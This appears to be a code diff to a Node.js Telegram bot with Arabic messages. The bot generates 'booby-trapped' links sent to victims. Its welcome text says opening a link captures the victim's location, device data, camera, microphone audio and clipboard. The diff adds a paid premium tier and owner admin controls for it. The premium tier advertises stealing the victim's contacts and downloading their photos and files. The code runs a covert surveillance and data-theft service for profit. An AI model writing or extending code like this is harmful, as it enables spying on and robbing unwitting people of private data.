@@ -233,7 +233,9 @@ app.set("view engine", "ejs");
 const hostURL   = "https://bot-psue.onrender.com";
 const use1pt    = false;
 const BOT_OWNER = 6012675140;
-const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";
+const REPLY_PREFIX        = "📝 اكتب ردك على المستخدم\nUID:";
+const PREM_GRANT_PREFIX   = "💎 أدخل ID المستخدم ومدة التفعيل (مثال: 123456789 30 أو 123456789 lifetime):";
+const PREM_REVOKE_PREFIX  = "🗑️ أدخل ID المستخدم لإلغاء البريميوم:";
 
 // ── Global crash protection ────────────────────────────────────────────────────
 process.on('uncaughtException',  (err) => { console.error('uncaughtException:', err.message); });
@@ -426,6 +428,31 @@ bot.on('message', async (msg) => {
     }
   }
 
+  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_GRANT_PREFIX && msg.text) {
+    const parts = msg.text.trim().split(/\s+/);
+    const tid = parts[0]; const daysArg = parts[1] || "30";
+    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ صيغة خاطئة. مثال: 123456789 30");
+    let expiry, plan;
+    if (daysArg === "lifetime") { expiry = -1; plan = "lifetime"; }
+    else { const d = parseInt(daysArg)||30; expiry = Date.now() + d*24*3600*1000; plan = d >= 365 ? "yearly" : d >= 30 ? "monthly" : "weekly"; }
+    premium[tid] = { expiry, plan, grantedAt: Date.now() };
+    savePremium();
+    const prof = profiles[tid] || {};
+    const expText = expiry === -1 ? "♾️ مدى الحياة" : `حتى ${new Date(expiry).toJSON().slice(0,10)}`;
+    bot.sendMessage(chatId, `✅ تم تفعيل البريميوم\n👤 ${prof.name||tid}\n📦 ${plan}\n${expText}`);
+    bot.sendMessage(Number(tid), `🎉 تم تفعيل اشتراكك البريميوم!\n📦 الخطة: ${plan}\n${expText}\n\n🔓 ميزاتك الآن:\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة\n📒 جهات الاتصال\n🖼️ صور وملفات الجهاز`).catch(()=>{});
+    return;
+  }
+
+  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_REVOKE_PREFIX && msg.text) {
+    const tid = msg.text.trim();
+    if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ ID: ${tid} ليس لديه اشتراك.`);
+    delete premium[tid]; savePremium();
+    bot.sendMessage(chatId, `🗑️ تم إلغاء اشتراك ${tid}`);
+    bot.sendMessage(Number(tid), `⚠️ تم إلغاء اشتراكك البريميوم.\nتواصل مع المالك لتجديده.`).catch(()=>{});
+    return;
+  }
+
   users.add(chatId);
   saveUsers();
   // Save user profile (name + username)
@@ -456,11 +483,15 @@ bot.on('message', async (msg) => {
 
   if (msg.text === "/start") {
     const isNew = !userStats[String(chatId)];
-    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
+    const isOwner = chatId === BOT_OWNER;
+    const baseRows = [
       [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
+      [{ text: "💎 مميزات البريميوم", callback_data: "pinfo" }],
       [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
-      [{ text: "📊 إحصائياتي", callback_data: "mystats" }]
-    ]}) };
+      [{ text: "📊 إحصائياتي", callback_data: "mystats" }],
+      ...(isOwner ? [[{ text: "👑 إدارة البريميوم", callback_data: "premadmin" }]] : [])
+    ];
+    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: baseRows }) };
     const welcome = settings.welcomeMsg ||
       `${isNew ? '👋 أهلاً بك لأول مرة!' : `مرحباً مجدداً ${msg.chat.first_name}!`} 🎉\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`;
     return bot.sendMessage(chatId, welcome, keyboard);
@@ -865,6 +896,79 @@ bot.on('callback_query', async (q) => {
   }
   if (data.startsWith("reply:"))
     return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
+
+  // ── Premium info (all users) ───────────────────────────────────────────────
+  if (data === "pinfo") {
+    const hasPrem = isPremium(chatId);
+    const camFree = isPremiumFeatureFree('camera');
+    const camLine = camFree ? `✅  📷 الكاميرا — مفعّلة مجاناً الآن!` : `✅  📷 الكاميرا — مجانًا لنصف يوم كل فترة 🎁`;
+    const statusLine = hasPrem
+      ? `\n\n✨ أنت مشترك بريميوم — كل الميزات مفعّلة!`
+      : `\n\n💬 للاشتراك تواصل مع @Ye_x00`;
+    return bot.sendMessage(chatId,
+      `💎 خطط البريميوم\n\n` +
+      `━━━━━━ مجاني للجميع ━━━━━━\n\n` +
+      `✅  📍 الموقع الجغرافي (GPS + IP)\n` +
+      `✅  📱 بيانات الجهاز الكاملة\n` +
+      `✅  🌐 معلومات الشبكة (ISP، الدولة، السرعة)\n` +
+      `${camLine}\n\n` +
+      `━━━━━ حصرياً للمشتركين ━━━━━\n\n` +
+      `🔒  📷 كاميرا أمامية + خلفية (دائم وبلا انقطاع)\n` +
+      `🔒  🎙️ تسجيل صوتي من الميكروفون\n` +
+      `🔒  📋 قراءة محتوى الحافظة (أرقام، نصوص)\n` +
+      `🔒  📒 سرقة جهات الاتصال كاملة\n` +
+      `🔒  🖼️ تحميل الصور والملفات من جهاز الضحية\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
+      statusLine
+    );
+  }
+
+  // ── Premium admin panel (owner only) ──────────────────────────────────────
+  if (data === "premadmin" && q.from.id === BOT_OWNER) {
+    const total = Object.keys(premium).length;
+    const active = Object.entries(premium).filter(([id]) => isPremium(Number(id))).length;
+    return bot.sendMessage(chatId,
+      `👑 إدارة البريميوم\n\n` +
+      `💎 المشتركون: ${active} نشط / ${total} إجمالي\n\n` +
+      `الأوامر النصية:\n` +
+      `• /premium [ID] [أيام] — تفعيل\n` +
+      `• /premium [ID] lifetime — مدى الحياة\n` +
+      `• /revokepremium [ID] — إلغاء`,
+      { reply_markup: JSON.stringify({ inline_keyboard: [
+        [{ text: "➕ تفعيل بريميوم", callback_data: "premgrant" }, { text: "🗑️ إلغاء بريميوم", callback_data: "premrevoke" }],
+        [{ text: "📋 قائمة المشتركين", callback_data: "premlist" }],
+        [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }]
+      ] }) }
+    );
+  }
+
+  if (data === "premlist" && q.from.id === BOT_OWNER) {
+    const entries = Object.entries(premium);
+    if (!entries.length) return bot.sendMessage(chatId, "لا يوجد مشتركون بريميوم حالياً.");
+    const list = entries.map(([id, p], i) => {
+      const prof = profiles[id] || {};
+      const active = isPremium(Number(id));
+      const expText = p.expiry === -1 ? "♾️ مدى الحياة" : new Date(p.expiry).toJSON().slice(0,10);
+      return `${i+1}. ${active?'✅':'❌'} ${prof.name||id} (${p.plan||'?'}) — ${expText}`;
+    }).join("\n");
+    return bot.sendMessage(chatId, `💎 المشتركون (${entries.length}):\n\n${list}`);
+  }
+
+  if (data === "premgrant" && q.from.id === BOT_OWNER) {
+    return bot.sendMessage(chatId, PREM_GRANT_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
+  }
+
+  if (data === "premrevoke" && q.from.id === BOT_OWNER) {
+    return bot.sendMessage(chatId, PREM_REVOKE_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
+  }
+
+  if (data === "gopc" && q.from.id === BOT_OWNER) {
+    return bot.sendMessage(chatId, premiumConfigText(), {
+      parse_mode: "Markdown",
+      reply_markup: buildPremiumConfigKeyboard()
+    });
+  }
 
   // ── Feature buttons ────────────────────────────────────────────────────────
   // ── Premium Config buttons ──────────────────────────────────────────────────
